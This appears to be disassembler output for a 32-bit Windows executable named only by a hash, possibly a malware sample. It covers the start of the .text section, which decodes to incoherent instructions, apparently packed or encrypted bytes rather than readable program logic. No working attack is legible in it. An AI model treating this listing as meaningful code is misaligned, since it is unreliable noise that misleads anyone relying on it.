
150737aeecfab1828a8e2349059f28628e7ea6d7db4086a41dae48eef550ce6b.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	inc    eax
  411001:	adc    BYTE PTR [ecx+0x0],al
  411004:	add    BYTE PTR [eax],al
  411006:	add    BYTE PTR [eax],al
  411008:	inc    eax
  411009:	adc    BYTE PTR [ecx+0x0],al
  41100c:	sub    al,0x7c
  41100e:	add    DWORD PTR [eax],eax
  411010:	ins    BYTE PTR es:[edi],dx
  411011:	mov    WORD PTR [edx+0x0],es
  411014:	push   esp
  411015:	fild   DWORD PTR [eax]
  411017:	add    al,al
  411019:	addr16 inc ebx
  41101b:	add    BYTE PTR [ebp+0x3a],bh
  41101e:	add    BYTE PTR [eax],al
  411020:	cmp    eax,0x2c0043a2
  411025:	jl     0x411028
  411027:	add    BYTE PTR [eax],al
  411029:	push   eax
  41102a:	inc    ebp
  41102b:	add    BYTE PTR [edi-0x51],dh
  41102e:	add    BYTE PTR [eax],al
  411030:	add    BYTE PTR [eax],ah
  411032:	inc    esi
  411033:	add    BYTE PTR [esi+0xf8],dl
  411039:	add    BYTE PTR [eax],al
  41103b:	add    BYTE PTR [eax],al
  41103d:	add    BYTE PTR [eax],al
  41103f:	add    al,ch
  411041:	xor    al,0x8
  411043:	and    eax,0x4be24fc9
  411048:	inc    edx
  411049:	add    ah,BYTE PTR [edi]
  41104b:	xchg   ebp,eax
  41104c:	jmp    0x41101c
  41104e:	ins    DWORD PTR es:[edi],dx
  41104f:	iret   
  411050:	leave  
  411051:	out    0xfe,al
  411053:	and    eax,0x115e7bf8
  411058:	add    ah,BYTE PTR ds:0x9db661f5
  41105e:	ds pop ecx
  411060:	xor    bl,BYTE PTR [ecx+0x77]
  411063:	push   esi
  411064:	popf   
  411065:	and    al,0xcf
  411067:	(bad)  
  411068:	mov    ecx,0xfb412773
  41106d:	dec    esi
  41106e:	xor    edx,ebx
  411070:	call   0xe069:0x15f14f67
  411077:	in     al,0x5d
  411079:	xor    BYTE PTR [edx+0x1c],al
  41107c:	inc    edi
  41107d:	(bad)  
  41107e:	loop   0x41106a
  411080:	cmp    al,0xf0
  411082:	sub    ebx,0x1be2c00d
  411088:	adc    al,0xf4
  41108a:	mov    ebx,0xb7d44e04
  41108f:	adc    al,0x95
  411091:	out    dx,al
  411092:	dec    ebx
  411093:	icebp  
  411094:	sbb    ecx,ebx
  411096:	mov    dl,0xf4
  411098:	adc    eax,0x6ce55b99
  41109d:	mov    edi,0xcfdc94b2
  4110a2:	sahf   
  4110a3:	cmp    ebx,DWORD PTR [eax+0x5f]
  4110a6:	rol    bh,cl
  4110a8:	cmc    
  4110a9:	fbstp  TBYTE PTR [edx-0x15]
  4110ac:	fdivr  QWORD PTR [edi-0x2]
  4110af:	stos   BYTE PTR es:[edi],al
  4110b0:	fcomp  QWORD PTR [edi-0x58215505]
  4110b6:	add    DWORD PTR [edx-0x181f0e2f],ebx
  4110bc:	out    dx,al
  4110bd:	pop    ebp
  4110be:	cmp    al,0x95
  4110c0:	jb     0x411102
  4110c2:	ins    BYTE PTR es:[edi],dx
  4110c3:	push   0x8d62f405
  4110c8:	retf   0x8891
  4110cb:	in     al,0x92
  4110cd:	test   al,0x68
  4110cf:	xchg   DWORD PTR [esi],esi
  4110d1:	int    0xd6
  4110d3:	pop    es
  4110d4:	mov    ds:0x19f532d7,al
  4110d9:	retf   
  4110da:	add    esi,DWORD PTR ds:0xc0385904
  4110e0:	inc    ebp
  4110e1:	or     bl,BYTE PTR [si]
  4110e4:	mov    dl,0xe1
  4110e6:	das    
  4110e7:	hlt    
  4110e8:	daa    
  4110e9:	das    
  4110ea:	clc    
  4110eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110ec:	push   ss
  4110ed:	jmp    0xe17581c2
  4110f2:	lods   eax,DWORD PTR ds:[si]
  4110f4:	adc    eax,0x72d43b99
  4110f9:	and    DWORD PTR [ebx-0x6456eaa6],edi
  4110ff:	in     al,0x15
  411101:	leave  
  411102:	mov    bl,0xe4
  411104:	push   ss
  411105:	mov    DWORD PTR [esp+ebp*2+0x5cfb9920],ecx
  41110c:	outs   dx,BYTE PTR ds:[esi]
  41110d:	and    BYTE PTR [esp+edx*4-0x427476df],bh
  411114:	mov    ch,0xa4
  411116:	stos   DWORD PTR es:[edi],eax
  411117:	in     al,0x15
  411119:	pop    ecx
  41111a:	(bad)  
  41111b:	in     al,0x39
  41111d:	add    BYTE PTR [eax+edi*8-0x75],bh
  411121:	sar    BYTE PTR [ebx-0x78],0xc3
  411125:	inc    ebx
  411126:	jl     0x41110f
  411128:	lods   eax,DWORD PTR ds:[esi]
  411129:	sub    DWORD PTR [eax-0x545ec1d0],esi
  41112f:	and    eax,0xe4ba17c5
  411134:	and    DWORD PTR [ecx+0x7bd53d8b],ecx
  41113a:	stos   DWORD PTR es:[edi],eax
  41113b:	in     al,0x35
  41113d:	stc    
  41113e:	loop   0x41111c
  411140:	sbb    al,0xf9
  411142:	loopne 0x4110cf
  411144:	or     al,0x99
  411146:	cmp    esp,DWORD PTR [ebx-0x7b549e92]
  41114c:	adc    eax,0x17e491e9
  411151:	pushf  
  411152:	imul   edi,DWORD PTR ds:0xe4b0c1c5,0x3e
  411159:	pop    esi
  41115a:	jl     0x4110f1
  41115c:	rol    DWORD PTR [edi],cl
  41115e:	ins    BYTE PTR es:[edi],dx
  41115f:	(bad)  
  411160:	(bad)  
  411161:	int3   
  411162:	push   0xf2c1ca0d
  411167:	retf   
  411168:	out    dx,al
  411169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41116a:	mov    ebx,0xa73915b7
  41116f:	in     al,0x15
  411171:	cdq    
  411172:	mov    ebx,0x6a2065f4
  411177:	inc    ebp
  411178:	loopne 0x411126
  41117a:	pop    ds
  41117b:	mov    ebx,0x4bd13cd6
  411180:	(bad)  
  411181:	fwait
  411182:	sub    DWORD PTR [esi+edx*1],ecx
  411185:	in     eax,0x52
  411187:	(bad)  
  411188:	pop    edx
  411189:	loopne 0x411193
  41118b:	jne    0x411181
  41118d:	icebp  
  41118e:	xchg   bx,ax
  411190:	adc    eax,0x55d4bb99
  411195:	xchg   ecx,eax
  411196:	imul   eax,edi,0x6d
  411199:	inc    ebp
  41119a:	ret    0x9b44
  41119d:	mov    bh,0xbc
  41119f:	inc    esp
  4111a0:	adc    eax,0x5e4af59
  4111a5:	cdq    
  4111a6:	or     ebp,DWORD PTR [ebp+0x44a4546d]
  4111ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111ad:	icebp  
  4111ae:	shr    DWORD PTR [eax+0x15],cl
  4111b1:	cdq    
  4111b2:	cmp    edx,esp
  4111b4:	outs   dx,BYTE PTR ds:[esi]
  4111b5:	and    ebx,ecx
  4111b7:	call   0xe916:0xe4983915
  4111be:	shl    BYTE PTR [eax],1
  4111c0:	push   esp
  4111c1:	pushf  
  4111c2:	lods   eax,DWORD PTR ds:[si]
  4111c4:	imul   ebx,DWORD PTR ds:0x71ca7abc,0x5ec68bf1
  4111ce:	aas    
  4111cf:	adc    eax,0x9d6bd09b
  4111d4:	(bad)  
  4111d5:	rol    DWORD PTR [edx-0x43df9996],1
  4111db:	push   ss
  4111dc:	ror    esp,cl
  4111de:	loopne 0x4111e7
  4111e0:	sub    eax,0x9a16366c
  4111e5:	cmp    edx,esp
  4111e7:	xor    al,0x9a
  4111e9:	div    DWORD PTR [edi-0x60c6ea1c]
  4111ef:	in     al,0x56
  4111f1:	ror    BYTE PTR [ebx],1
  4111f3:	test   eax,0x98d8b794
  4111f8:	inc    esi
  4111f9:	(bad)  
  4111fb:	and    bl,BYTE PTR [ebx+0x2634ec89]
  411201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411202:	sub    DWORD PTR [eax],edx
  411204:	inc    esi
  411205:	pop    ebp
  411206:	fst    QWORD PTR [edx+ebx*4]
  411209:	dec    ecx
  41120a:	in     al,0x34
  41120c:	sbb    ax,0x14bc
  411210:	pop    edx
  411211:	pop    ebx
  411212:	dec    ebp
  411213:	sub    eax,0x7acc2542
  411218:	retf   
  411219:	popa   
  41121a:	mov    edx,0xab89dd34
  41121f:	inc    esp
  411220:	xchg   esi,eax
  411221:	daa    
  411222:	add    eax,0xa839156c
  411227:	in     al,0x56
  411229:	or     esp,DWORD PTR [ebp*1+0x28f7b998]
  411230:	gs dec esi
  411232:	hlt    
  411233:	in     al,0x5e
  411235:	gs jp  0x41125b
  411238:	and    al,0x99
  41123a:	mov    ebx,0xbe61256a
  41123f:	in     al,0x4f
  411241:	call   0x94b3:0xd1eb06ff
  411248:	pop    ss
  411249:	popf   
  41124a:	fwait
  41124b:	add    al,0xf4
  41124d:	cmp    BYTE PTR [ebx-0x500e4a97],0xe4
  411254:	mov    WORD PTR [esi-0x6f68b8e],fs
  41125a:	repnz pop esi
  41125c:	hlt    
  41125d:	mov    ?,WORD PTR [ebx+0x74]
  411260:	mov    ch,0xf1
  411262:	scas   eax,DWORD PTR es:[edi]
  411263:	in     al,0xbc
  411265:	lods   eax,DWORD PTR ds:[esi]
  411266:	xor    al,0x74
  411268:	adc    eax,0xf45e22f9
  41126d:	lea    edi,[ebx+0x74]
  411270:	mov    ch,0xf1
  411272:	scas   eax,DWORD PTR es:[edi]
  411273:	in     al,0x6e
  411275:	pop    ebp
  411276:	sti    
  411277:	mov    ds:0xe4ec8cd9,eax
  41127c:	pop    edx
  41127d:	push   0x24
  41127f:	lock xchg esi,eax
  411281:	dec    edx
  411282:	hlt    
  411283:	or     BYTE PTR [esi-0x17],al
  411286:	mov    al,0xa9
  411288:	outs   dx,BYTE PTR ds:[esi]
  411289:	sahf   
  41128a:	jp     0x411210
  41128c:	sbb    ch,BYTE PTR [edx]
  41128e:	in     al,0xe4
  411290:	aam    0x71
  411292:	add    ebp,DWORD PTR [edx-0x5c855f92]
  411298:	gs lock popa 
  41129b:	pop    eax
  41129c:	cdq    
  41129d:	div    DWORD PTR [edx-0x51]
  4112a0:	jle    0x41130b
  4112a2:	and    al,0xa4
  4112a4:	pop    eax
  4112a5:	dec    ecx
  4112a6:	(bad)  
  4112a7:	call   0x694b7321
  4112ac:	pop    ss
  4112ad:	cdq    
  4112ae:	dec    ebx
  4112af:	lock jle 0x411320
  4112b2:	mov    ebx,0x5f412cb4
  4112b7:	dec    ecx
  4112b8:	push   esi
  4112b9:	loopne 0x411316
  4112bb:	jnp    0x411292
  4112bd:	daa    
  4112be:	fst    DWORD PTR [edx-0x43]
  4112c1:	sbb    al,0x5a
  4112c3:	jmp    0x6c41548f
  4112c8:	fisubr WORD PTR [ebp-0x62164b34]
  4112ce:	or     dl,BYTE PTR [ebp-0x542f933a]
  4112d4:	lea    ecx,[ecx+0x7f]
  4112d7:	and    esp,DWORD PTR [ebp-0x40]
  4112da:	mov    ebp,DWORD PTR [ecx]
  4112dc:	xor    DWORD PTR [ecx+0x6f],eax
  4112df:	xchg   ebx,eax
  4112e0:	push   ds
  4112e1:	mov    ds:0xc1c7edb4,al
  4112e6:	sti    
  4112e7:	dec    ebx
  4112e8:	and    al,0xa8
  4112ea:	or     ah,bh
  4112ec:	sbb    DWORD PTR [esi+0x6ac3b0],ebx
  4112f2:	mov    esp,0xba58fde9
  4112f7:	mov    esi,es
  4112f9:	out    0xf7,eax
  4112fb:	cmp    esp,DWORD PTR [edx-0x77]
  4112fe:	jmp    0x41130c
  411300:	lods   al,BYTE PTR ds:[esi]
  411301:	(bad)
  411304:	gs dec esi
  411306:	hlt    
  411307:	in     al,0xcb
  411309:	icebp  
  41130a:	jb     0x4112ff
  41130c:	out    dx,al
  41130d:	and    BYTE PTR [ebp+edx*4+0x21],bh
  411311:	sar    DWORD PTR [esi+0x14],1
  411314:	push   eax
  411315:	les    ebp,FWORD PTR [ebx+0x32]
  411318:	sbb    al,0x99
  41131a:	cmp    eax,ebx
  41131c:	jge    0x4112f6
  41131e:	mov    esi,0x4b9f6414
  411323:	jno    0x41136a
  411325:	pusha  
  411326:	mov    ebp,0xe157a1e4
  41132b:	out    0x15,eax
  41132d:	leave  
  41132e:	mov    dl,0xe4
  411330:	inc    ecx
  411331:	test   eax,0x979616ef
  411336:	mov    al,0xef
  411338:	adc    eax,0x8de4bcb9
  41133d:	clc    
  41133e:	mov    dl,0x20
  411340:	shl    bh,1
  411342:	test   al,0x88
  411344:	sbb    bl,BYTE PTR [ecx-0xa373cc5]
  41134a:	mov    dl,0x94
  41134c:	inc    esp
  41134d:	popf   
  41134e:	mov    ebx,0xbe27c565
  411353:	in     al,0xa2
  411355:	out    0x72,eax
  411357:	jmp    DWORD PTR [edi-0x61e675ab]
  41135d:	lods   eax,DWORD PTR ds:[esi]
  41135e:	ja     0x411356
  411360:	(bad)  
  411361:	and    edi,DWORD PTR [edx+0x7b991572]
  411367:	out    0xe5,eax
  411369:	mov    al,ds:0x99bde88b
  41136e:	mov    bl,0x14
  411370:	inc    esi
  411371:	add    BYTE PTR [esp+eax*2+0x15],bh
  411375:	adc    ebx,esp
  411377:	ins    BYTE PTR es:[edi],dx
  411378:	sub    ebp,ebp
  41137a:	aam    0xf4
  41137c:	push   edx
  41137d:	mov    ah,0x6b
  41137f:	cmp    eax,0x9a1e588e
  411384:	xor    DWORD PTR gs:[ecx+0x68b93e23],0xffffffd3
  41138c:	mov    dh,0x1
  41138e:	or     eax,0x17d6373c
  411393:	or     DWORD PTR [edx],esi
  411395:	sbb    eax,0x991577ea
  41139a:	fwait
  41139b:	jecxz  0x41133f
  41139d:	pop    ss
  41139e:	jmp    0xd2e4:0xa2c91575
  4113a5:	pop    ebx
  4113a6:	shl    DWORD PTR [ebx],cl
  4113a8:	test   al,0x61
  4113aa:	repz data16 daa 
  4113ad:	das    
  4113ae:	clc    
  4113af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113b0:	push   ss
  4113b1:	jmp    0xe1958486
  4113b6:	lods   eax,DWORD PTR ds:[si]
  4113b8:	retf   
  4113b9:	icebp  
  4113ba:	mov    edi,0x3a9918f3
  4113bf:	xor    eax,0xe4a3af85
  4113c4:	mov    edx,0x1eb832ee
  4113c9:	pop    esi
  4113ca:	out    dx,eax
  4113cb:	xchg   ebp,eax
  4113cc:	and    eax,0x458ccc99
  4113d1:	and    BYTE PTR [esp+eiz*8-0x4e44323],bh
  4113d8:	pop    edx
  4113d9:	adc    BYTE PTR [ecx+edi*1-0x187465eb],bh
  4113e0:	adc    al,0x37
  4113e2:	mov    ah,0x94
  4113e4:	xchg   esi,eax
  4113e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113e6:	or     ebp,DWORD PTR [ecx+0x15]
  4113e9:	test   eax,0xed08e4b3
  4113ee:	jl     0x411417
  4113f0:	lds    ebp,FWORD PTR [esi-0x4c]
  4113f3:	call   0xfd30ae2c
  4113f8:	call   0x7439:0x15e4baa7
  4113ff:	in     al,0xb4
  411401:	and    al,0xe
  411403:	jmp    0xe55cdd1d
  411408:	xor    ebx,DWORD PTR [edx+0x1deebd6f]
  41140e:	mov    ebx,0x5b9f9974
  411413:	jmp    0x41142a
  411415:	test   eax,0x3f95e7b0
  41141a:	push   eax
  41141b:	jmp    0x4113cf
  41141d:	mov    DWORD PTR [ebx+0xac7a4c5],ecx
  411423:	in     al,dx
  411424:	adc    eax,0xf5e48439
  411429:	rol    DWORD PTR [esi],1
  41142b:	test   eax,0xbb9d17
  411430:	fstp   QWORD PTR [eax+0x64]
  411433:	mov    ebp,0x69898955
  411438:	push   ebx
  411439:	call   0xf2dfdba3
  41143e:	mov    WORD PTR ds:0xe8b9a905,ds
  411444:	mov    eax,ds:0x51d8d17
  411449:	fnstenv [esi-0x7462e818]
  41144f:	add    al,BYTE PTR [edi+ebx*2]
  411452:	sbb    ebp,DWORD PTR [edx-0x2b]
  411455:	int3   
  411456:	mov    ds:0xcb9d17e4,eax
  41145b:	add    cl,BYTE PTR [esi-0x45]
  41145e:	stos   DWORD PTR es:[edi],eax
  41145f:	xor    eax,0xe4b6d905
  411464:	pop    ss
  411465:	popf   
  411466:	or     eax,DWORD PTR [ebx]
  411468:	cdq    
  411469:	scas   eax,DWORD PTR es:[edi]
  41146a:	pop    esi
  41146b:	jmp    0x41147e
  41146d:	xchg   ecx,eax
  41146e:	sti    
  41146f:	stos   DWORD PTR es:[edi],eax
  411470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411471:	mov    DWORD PTR ds:0x843915ec,0x799d5e4
  41147b:	sub    DWORD PTR [esi-0x47],ecx
  41147e:	stos   DWORD PTR es:[edi],eax
  41147f:	and    eax,0xe4bb21c5
  411484:	fwait
  411485:	push   edi
  411486:	adc    ebx,DWORD PTR [edx+0x15]
  411489:	pop    ecx
  41148a:	lahf   
  41148b:	in     al,0x34
  41148d:	call   0xd4ba:0x81663cef
  411494:	adc    eax,0x84e4c099
  411499:	pop    edx
  41149a:	sub    ebp,DWORD PTR [edx-0x2b]
  41149d:	int3   
  41149e:	mov    ds:0x4b9d17e4,eax
  4114a3:	add    ecx,esi
  4114a5:	mov    dh,0xab
  4114a7:	xor    eax,0xe4b2f1c5
  4114ac:	out    dx,al
  4114ad:	loopne 0x4114e9
  4114af:	xchg   ebp,eax
  4114b0:	sbb    DWORD PTR [ecx+0x29d9b04b],ebx
  4114b6:	mov    edi,0xd5e84674
  4114bb:	or     ebx,DWORD PTR [ebp+0x553d6449]
  4114c1:	mov    DWORD PTR [ebx+0x7f60762c],eax
  4114c7:	sbb    BYTE PTR [esi-0x3],bh
  4114ca:	sbb    al,0x9b
  4114cc:	mov    ?,ebp
  4114ce:	sbb    al,0x7b
  4114d0:	pop    edx
  4114d1:	fsubr  DWORD PTR [ebx-0x43]
  4114d4:	mov    ecx,0x1ca94b9f
  4114d9:	(bad)  
  4114da:	sti    
  4114db:	mov    DWORD PTR [edx],ecx
  4114dd:	stc    
  4114de:	ret    0xceb
  4114e1:	mov    WORD PTR [edx],?
  4114e3:	gs push es
  4114e5:	stc    
  4114e6:	adc    ah,ch
  4114e8:	aam    0x6b
  4114ea:	mov    ebx,0xa44ea573
  4114ef:	in     al,0xc6
  4114f1:	icebp  
  4114f2:	sub    BYTE PTR [esi+edi*8-0x2b],0xfb
  4114f7:	mov    ds:0xa99031c9,eax
  4114fc:	gs push ebx
  4114fe:	hlt    
  4114ff:	sbb    DWORD PTR [esi+0x49],eax
  411502:	sub    DWORD PTR [edx-0x7a],0x86d87054
  411509:	aam    0x12
  41150b:	aad    0x5e
  41150d:	cmp    ch,0xb5
  411510:	sub    ecx,DWORD PTR [esi+0x34]
  411513:	inc    esi
  411514:	inc    esi
  411515:	jns    0x41149a
  411517:	ins    BYTE PTR es:[edi],dx
  411518:	(bad)  
  411519:	sbb    eax,0x1c9a957c
  41151e:	pusha  
  41151f:	sbb    eax,0x64e8a892
  411524:	xor    dh,BYTE PTR ds:0xd51966ea
  41152a:	ficom  DWORD PTR [esi+edi*8]
  41152d:	popf   
  41152e:	ins    BYTE PTR es:[edi],dx
  41152f:	lahf   
  411530:	fisttp QWORD PTR [ecx+0x64]
  411533:	int    0x47
  411535:	jmp    0x2127414c
  41153a:	cld    
  41153b:	and    esi,DWORD PTR [eax-0x5dcc1e82]
  411541:	mov    ebx,0xe0754ce9
  411546:	jp     0x411529
  411548:	dec    DWORD PTR [edx+0x32]
  41154b:	mov    ebx,0xdaeaa075
  411550:	loop   0x4114ea
  411552:	cmp    esi,DWORD PTR [ebx]
  411554:	into   
  411555:	loope  0x4114fa
  411557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411558:	adc    eax,0xcee4b9c9
  41155d:	mov    ds:0xc9159b63,al
  411562:	mov    ebx,0x82d1c6e4
  411567:	push   0x76
  411569:	call   0x20a7aae0
  41156e:	ins    BYTE PTR es:[edi],dx
  41156f:	sbb    dh,BYTE PTR [eax+edx*2-0x662a95e5]
  411576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411577:	in     al,0x77
  411579:	push   ds
  41157a:	add    cl,BYTE PTR [ecx+esi*1]
  41157d:	xchg   ebp,eax
  41157e:	(bad)  
  41157f:	mov    ebp,0x44aa281d
  411584:	adc    eax,0x61adcb99
  411589:	adc    BYTE PTR [edi-0x1b],ch
  41158c:	rcl    BYTE PTR [ecx+0x63],cl
  41158f:	in     eax,dx
  411590:	dec    esi
  411591:	dec    esp
  411592:	mov    esp,0x14493d95
  411597:	inc    esp
  411598:	data16 and BYTE PTR [esp],ch
  41159c:	popf   
  41159d:	imul   esp,esi,0x6d9061b4
  4115a3:	in     eax,0x21
  4115a5:	cwde   
  4115a6:	lods   eax,DWORD PTR ds:[esi]
  4115a7:	test   DWORD PTR [esi-0x17],eax
  4115aa:	fistp  QWORD PTR [ebx]
  4115ac:	sbb    DWORD PTR [ebp-0x70641ad0],edi
  4115b2:	mov    ebx,0xab95ad09
  4115b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115b9:	inc    edi
  4115ba:	add    esp,ebp
  4115bc:	adc    eax,0xe4e47149
  4115c1:	(bad)  
  4115c2:	arpl   WORD PTR [edi+0x30e587c7],bx
  4115c8:	fwait
  4115c9:	dec    ecx
  4115ca:	fs cmp eax,0x6a814946
  4115d0:	dec    eax
  4115d1:	fidivr WORD PTR [esi-0x68]
  4115d4:	jp     0x411565
  4115d6:	cld    
  4115d7:	jmp    0x411655
  4115d9:	call   0x6bd7:0x514a205b
  4115e0:	adc    eax,0xdeefb99
  4115e5:	dec    ebp
  4115e6:	mov    ah,0x24
  4115e8:	inc    esi
  4115e9:	leave  
  4115ea:	push   es
  4115eb:	ins    BYTE PTR es:[edi],dx
  4115ec:	adc    eax,0x49eebb99
  4115f1:	imul   esp,DWORD PTR [ebx-0x33],0x953bddfe
  4115f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115f9:	test   eax,0x6b947ce8
  4115fe:	inc    esi
  4115ff:	and    ebp,esp
  411601:	add    eax,DWORD PTR [edx+0x42dc154f]
  411607:	out    dx,eax
  411608:	or     BYTE PTR [ecx-0x26dacac4],bl
  41160e:	mov    esp,0x345804e4
  411613:	or     BYTE PTR [esi-0x37],al
  411616:	add    ebp,DWORD PTR [ecx+0x15]
  411619:	cdq    
  41161a:	mov    ebx,0xeba35eee
  41161f:	adc    al,0xc5
  411621:	pushf  
  411622:	mov    edx,0xd451d2e4
  411627:	mov    edx,DWORD PTR ds:0x6f0fb99
  41162d:	stc    
  41162e:	loop   0x4116a2
  411630:	in     al,0x58
  411632:	cmp    esp,DWORD PTR [ebp+0x65]
  411635:	scas   eax,DWORD PTR es:[edi]
  411636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411637:	in     al,0x15
  411639:	cdq    
  41163a:	mov    ebx,0x6449d9e7
  41163f:	in     eax,dx
  411640:	(bad)  
  411641:	and    DWORD PTR [eax+0x3c1e6ea8],esi
  411647:	xchg   esi,eax
  411648:	call   0x4f29:0x1ee842da
  41164f:	xchg   ebp,eax
  411650:	addr16 loopne 0x41168d
  411653:	imul   ecx,eax,0xe6e36051
  411659:	sbb    eax,0x2ada173c
  41165e:	inc    esp
  41165f:	ins    DWORD PTR es:[edi],dx
  411660:	xchg   BYTE PTR [ebp-0x66ead671],ah
  411666:	mov    ebx,0xbfd88cf6
  41166b:	inc    esp
  41166c:	adc    eax,0x72e612eb
  411671:	popf   
  411672:	sub    al,0x55
  411674:	adc    eax,0x5ae4bb99
  411679:	pop    ebx
  41167a:	sub    eax,0xbb991531
  41167f:	in     al,0x42
  411681:	in     eax,0xcb
  411683:	jp     0x4116a1
  411685:	sbb    DWORD PTR [edx+0x7dea1f84],esi
  41168b:	popa   
  41168c:	sbb    eax,0x1544aa28
  411691:	cdq    
  411692:	or     ebx,DWORD PTR [ebp+0x69849eb9]
  411698:	jbe    0x411659
  41169a:	cmp    ebx,DWORD PTR [eax]
  41169c:	es nop
  41169e:	sti    
  41169f:	je     0x4116e2
  4116a1:	mov    ch,0xc4
  4116a3:	ins    BYTE PTR es:[edi],dx
  4116a4:	cmp    ebp,esi
  4116a6:	int3   
  4116a7:	in     al,0xb5
  4116a9:	pop    ecx
  4116aa:	sbb    eax,0x9b24b771
  4116af:	aad    0xb1
  4116b1:	imul   edi,DWORD PTR [eax-0x3fa6cedc],0xb21e5666
  4116bb:	nop
  4116bc:	sbb    eax,0xd1b4c7b
  4116c1:	adc    BYTE PTR [edx+0x240feb0b],dh
  4116c7:	sti    
  4116c8:	cli    
  4116c9:	(bad)  
  4116ca:	in     eax,dx
  4116cb:	pop    edx
  4116cc:	(bad)  
  4116cd:	(bad)  
  4116ce:	mov    eax,ds:0x2f61029
  4116d3:	fld    TBYTE PTR [edi-0x5955401]
  4116d9:	shl    al,1
  4116db:	fmul   DWORD PTR [eax+eiz*8]
  4116de:	loope  0x411694
  4116e0:	call   0xd90c1b0e
  4116e5:	fstp   QWORD PTR [edi+0x25]
  4116e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116e9:	bound  ebp,QWORD PTR [ebx]
  4116eb:	cmc    
  4116ec:	call   0x5119:0x5b1a44c8
  4116f3:	fdivr  QWORD PTR gs:[ecx]
  4116f6:	sahf   
  4116f7:	cmp    dh,dl
  4116f9:	and    BYTE PTR [edi-0x10d2fd96],ch
  4116ff:	or     BYTE PTR [ebx+ebx*2],bl
  411702:	fisub  WORD PTR [esi+0x7a]
  411705:	cmp    eax,0x1a2d2d90
  41170a:	cld    
  41170b:	out    0x26,eax
  41170d:	sbb    DWORD PTR [edi-0x164db697],ecx
  411713:	and    eax,0x773ca195
  411718:	and    esi,ecx
  41171a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41171b:	jo     0x411737
  41171d:	ins    BYTE PTR es:[edi],dx
  41171e:	(bad)  
  41171f:	fst    DWORD PTR [esi+0x3a6d5749]
  411725:	lods   eax,DWORD PTR ds:[esi]
  411726:	jge    0x411744
  411728:	ds mov cs:0xe1a19c05,al
  41172f:	push   0x1a
  411731:	out    dx,al
  411732:	jg     0x411724
  411734:	sub    bl,BYTE PTR [ecx-0x1779534e]
  41173a:	fiadd  DWORD PTR [edx+ebx*2-0x41244826]
  411741:	test   eax,0xa2202bb
  411746:	pusha  
  411747:	xchg   ebp,eax
  411748:	data16 cli 
  41174a:	mov    ecx,0x1caaa733
  41174f:	and    eax,0xa087ba16
  411754:	mov    dh,0xad
  411756:	push   DWORD PTR [esi]
  411758:	cmp    ch,BYTE PTR [ecx+0x7c]
  41175b:	xor    eax,0xf59c3d25
  411760:	pop    esp
  411761:	fwait
  411762:	xor    esp,ebp
  411764:	sub    ch,BYTE PTR [edi+0x74]
  411767:	xor    eax,0x3c4d8d86
  41176c:	jmp    0x411787
  41176e:	(bad)  
  41176f:	and    esp,DWORD PTR [esi+0x64664c93]
  411775:	cmp    BYTE PTR [edx+0x18],dh
  411778:	sub    esi,DWORD PTR [edx]
  41177a:	jecxz  0x411767
  41177c:	pop    ss
  41177d:	mov    dh,BYTE PTR [eax]
  41177f:	out    0xc3,al
  411781:	scas   al,BYTE PTR es:[edi]
  411782:	dec    ebx
  411783:	stc    
  411784:	fcomp  st(2)
  411786:	jb     0x41175c
  411788:	lods   eax,DWORD PTR ds:[esi]
  411789:	ja     0x41178f
  41178b:	imul   esp,DWORD PTR [esi],0xfffffff2
  41178e:	add    ebp,DWORD PTR [esi+0x34571c66]
  411794:	inc    esi
  411795:	mov    ebp,0x29bae4de
  41179a:	lock leave 
  41179c:	idiv   BYTE PTR [ecx-0x42]
  41179f:	xchg   esi,eax
  4117a0:	mov    ebp,0x171bd1cd
  4117a5:	fild   WORD PTR [ebp+0x7caeb635]
  4117ab:	(bad)  
  4117ac:	push   esi
  4117ad:	fs popf 
  4117af:	xor    al,0x28
  4117b1:	mov    DWORD PTR [ebx],esi
  4117b3:	xchg   edi,eax
  4117b4:	push   edx
  4117b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117b6:	xor    ah,BYTE PTR [edx-0x5a93c3f6]
  4117bc:	cmp    BYTE PTR [ebx-0x47],al
  4117bf:	nop
  4117c0:	sbb    al,0x89
  4117c2:	retf   
  4117c3:	dec    ebx
  4117c4:	(bad)  
  4117c5:	mov    eax,ds:0x9799c780
  4117ca:	lea    edx,[ebx+0x71]
  4117cd:	xchg   edx,eax
  4117ce:	out    dx,eax
  4117cf:	and    eax,0x26879ebe
  4117d4:	sub    DWORD PTR [edx-0x3e],0xf3a91e5f
  4117db:	xchg   edx,eax
  4117dc:	cmp    BYTE PTR [edi-0x73b62eec],bl
  4117e2:	mov    ds:0xadba8978,eax
  4117e7:	imul   ecx,DWORD PTR [eax-0x15ab4bdd],0xe9fa062f
  4117f1:	ins    BYTE PTR es:[edi],dx
  4117f2:	test   eax,0xfc9f2305
  4117f7:	in     eax,0x3c
  4117f9:	cdq    
  4117fa:	cmp    eax,DWORD PTR [edi]
  4117fc:	clc    
  4117fd:	push   ecx
  4117fe:	push   0x7c4f9b64
  411803:	jo     0x4117f6
  411805:	imul   esp,ebp,0x34
  411808:	xor    BYTE PTR [ebx+0x44],dl
  41180b:	test   eax,0xe59bf6c2
  411810:	push   es
  411811:	out    0xbc,eax
  411813:	sbb    ah,cl
  411815:	cmp    eax,0x3435b79a
  41181b:	jle    0x4117d2
  41181d:	(bad)  
  41181f:	aam    0xa0
  411821:	add    DWORD PTR [ecx+eax*8],ebx
  411824:	inc    ebp
  411825:	mov    ecx,0x266ae654
  41182a:	xchg   edx,eax
  41182b:	out    dx,eax
  41182c:	pop    ss
